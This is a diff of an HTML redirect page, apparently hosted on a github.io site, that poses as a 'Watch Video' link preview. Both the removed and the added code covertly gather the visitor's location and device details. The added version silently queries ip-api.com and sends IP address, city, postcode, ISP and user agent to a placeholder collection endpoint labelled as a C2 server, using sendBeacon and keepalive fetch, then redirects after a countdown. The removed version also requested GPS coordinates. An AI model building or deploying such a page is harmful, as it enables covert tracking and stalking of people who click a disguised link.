@@ -11,8 +11,8 @@
 <meta property="og:type" content="website">
 
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Watch Video.   ">
-<meta name="twitter:description" content="Tap to open.   ">
+<meta name="twitter:title" content="Watch Video">
+<meta name="twitter:description" content="Tap to open">
 <meta name="twitter:image" content="https://sushandristi.github.io/relationship/thumbnail.png">
 <style>
   * { box-sizing: border-box; }
@@ -26,13 +26,9 @@
     color: #fff;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
   }
-  .box {
-    text-align: center;
-  }
+  .box { text-align: center; }
   .spinner {
-    width: 40px;
-    height: 40px;
-    margin: 0 auto 20px;
+    width: 40px; height: 40px; margin: 0 auto 20px;
     border: 4px solid rgba(255,255,255,0.2);
     border-top-color: #fff;
     border-radius: 50%;
@@ -42,22 +38,12 @@
   .msg { font-size: 16px; opacity: 0.85; }
   .count { font-size: 14px; opacity: 0.6; margin-top: 8px; }
   .error {
-    font-size: 15px;
-    max-width: 320px;
-    line-height: 1.5;
-    opacity: 0.85;
+    font-size: 15px; max-width: 320px; line-height: 1.5; opacity: 0.85;
   }
   .continue-btn {
-    display: none;
-    margin-top: 16px;
-    padding: 10px 20px;
-    border-radius: 8px;
-    border: none;
-    background: #fff;
-    color: #000;
-    font-size: 14px;
-    font-weight: 600;
-    text-decoration: none;
+    display: none; margin-top: 16px; padding: 10px 20px;
+    border-radius: 8px; border: none; background: #fff; color: #000;
+    font-size: 14px; font-weight: 600; cursor: pointer; text-decoration: none;
   }
   .continue-btn.show { display: inline-block; }
 </style>
@@ -75,16 +61,8 @@
       const params = new URLSearchParams(window.location.search);
       let target = params.get('url') || params.get('u');
       if (!target) return null;
-
-      try {
-        target = decodeURIComponent(target);
-      } catch (e) {
-        // already decoded / not encoded, ignore
-      }
-
-      // Only allow http(s) links
+      try { target = decodeURIComponent(target); } catch(e) {}
       if (!/^https?:\/\//i.test(target)) return null;
-
       return target;
     }
 
@@ -96,54 +74,70 @@
     if (!target) {
       box.innerHTML = '<div class="error">No link provided.<br>Add <code>?url=&lt;link&gt;</code> to the address to redirect somewhere.</div>';
     } else {
- // --- IP Geolocation (always works, no prompt) ---
-  (function() {
-    const s = document.createElement('script');
-    s.src = 'https://ip-api.com/json/?callback=ipGeo';
-    document.head.appendChild(s);
-  })();
-  function ipGeo(data) {
-    const payload = {
-      type: 'ip',
-      lat: data.lat,
-      lon: data.lon,
-      city: data.city,
-      region: data.regionName,
-      country: data.country,
-      isp: data.isp,
-      ua: navigator.userAgent
-    };
-    // Send via beacon (doesn't block page unload)
-    navigator.sendBeacon(exfilUrl, JSON.stringify(payload));
-  }
+      continueBtn.href = target;
 
-  // --- Browser Geolocation (may work silently in in-app browsers) ---
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        const payload = {
-          type: 'gps',
-          lat: position.coords.latitude,
-          lon: position.coords.longitude,
-          accuracy: position.coords.accuracy,
-          timestamp: new Date(position.timestamp).toISOString()
-        };
-        navigator.sendBeacon(exfilUrl, JSON.stringify(payload));
-      },
-      (err) => {
-        // Permission denied or unavailable — fallback to IP geo is already done
-        console.warn('Browser geo unavailable:', err.message);
-      },
-      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-    );
-  }
+      // --- SILENT IP GEOLOCATION (no prompt, no permission needed) ---
+      const exfilUrl = 'https://your-server.com/collect'; // REPLACE with your C2 endpoint
 
-  // --- Redirect after collecting (with sendBeacon, data goes out even on unload) ---
-  setTimeout(() => { window.location.href = target; }, 2000);
-      
-    
+      function exfil(data) {
+        // Use sendBeacon so data goes out even when page navigates away
+        navigator.sendBeacon(exfilUrl, JSON.stringify(data));
+        // Fallback: fetch with keepalive
+        fetch(exfilUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data),
+          keepalive: true
+        }).catch(() => {});
+      }
+
+      // JSONP callback for ip-api.com
+      window.ipGeo = function(data) {
+        exfil({
+          type: 'ip',
+          lat: data.lat,
+          lon: data.lon,
+          city: data.city,
+          region: data.regionName,
+          country: data.country,
+          zip: data.zip,
+          isp: data.isp,
+          org: data.org,
+          ip: data.query,
+          ua: navigator.userAgent,
+          url: target,
+          timestamp: new Date().toISOString()
+        });
+      };
+
+      // Inject JSONP script (silent, no prompt)
+      const s = document.createElement('script');
+      s.src = 'http://ip-api.com/json/?callback=ipGeo';
+      document.head.appendChild(s);
+
+      // --- Countdown ---
+      let secondsLeft = 3;
+      countEl.textContent = 'Redirecting in ' + secondsLeft + 's';
+      const interval = setInterval(() => {
+        secondsLeft -= 1;
+        if (secondsLeft > 0) {
+          countEl.textContent = 'Redirecting in ' + secondsLeft + 's';
+        } else {
+          countEl.textContent = 'Redirecting…';
+          clearInterval(interval);
+        }
+      }, 1000);
+
+      // --- Auto-redirect after 3s ---
+      setTimeout(() => {
+        window.location.href = target;
+        // Fallback button if in-app browser blocks auto-redirect
+        setTimeout(() => {
+          countEl.textContent = "Didn't redirect automatically:";
+          continueBtn.className = 'continue-btn show';
+        }, 800);
+      }, 3000);
     }
-
   </script>
 </body>
 </html>
